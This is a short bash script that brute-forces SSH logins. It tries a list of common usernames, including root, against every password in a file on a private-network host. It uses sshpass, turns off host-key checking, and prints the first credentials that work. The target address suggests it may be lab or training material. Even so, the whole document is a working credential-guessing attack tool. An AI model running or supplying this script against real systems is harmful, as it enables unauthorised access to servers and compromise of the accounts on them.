#!/bin/bash

TARGET="172.16.10.13"
PORT="22"

USERNAMES=("root" "guest" "backup" "ubuntu" "centos")
PASSWORD_FILE="passwords.txt"
echo "Starting brute-forcing..."

for user in "${USERNAMES[@]}"; do
    while IFS= read -r pass; do # IFS= (empty) to save the spaces for the read command
        echo "Testing credentials ${user} - ${pass}"
        # sshpass to enter password, ssh -o avoid security questions
        if sshpass -p "${pass}" ssh -o "StrictHostKeyChecking=no" -p "${PORT}" "${user}@${TARGET}" exit >/dev/null 2>&1; then
            echo "Success, login with credentials: "
            echo "Host: ${TARGET}"
            echo "Port: ${PORT}"
            echo "Username: ${user}"
            echo "Password: ${pass}"
            exit 0
        fi
    done < "${PASSWORD_FILE}"
done
echo "No valid credentials found"
